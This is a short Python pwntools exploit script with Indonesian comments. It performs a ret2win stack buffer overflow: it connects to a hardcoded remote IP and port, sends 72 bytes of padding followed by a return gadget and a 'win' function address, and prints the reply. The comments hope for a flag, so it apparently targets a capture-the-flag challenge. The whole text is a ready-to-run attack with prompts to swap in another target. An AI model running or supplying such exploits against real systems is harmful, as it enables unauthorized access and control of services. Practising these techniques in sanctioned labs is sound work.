from pwn import *

# Konfigurasi Target (GANTI BAGIAN INI)
TARGET_IP = '103.127.98.249' # Ganti 'example.com' dengan IP target lu
TARGET_PORT = 10001

# Alamat memori (pastikan ini sesuai dengan binary lu)
ret_address = 0x000000000040121e
win_address = 0x0000000000401196
offset = 72

# Bikin koneksi remote
print(f"[+] Mencoba konek ke {TARGET_IP}:{TARGET_PORT}...")
p = remote(TARGET_IP, TARGET_PORT)

# Susun payload
payload = b'A' * offset
payload += p64(ret_address)
payload += p64(win_address)

# Eksekusi interaksi dengan server
try:
    # Tunggu sampai server ngeluarin tulisan "Give me your input:"
    p.recvuntil(b"Give me your input:\n")
    
    # Kirim payload
    print("[+] Ngirim payload...")
    p.sendline(payload)
    
    # Ambil dan print semua balasan dari server (harapannya dapet flag di sini)
    result = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print("\n[+] Balasan dari server:")
    print(result)

except Exception as e:
    print(f"[-] Terjadi error saat interaksi: {e}")
finally:
    p.close()
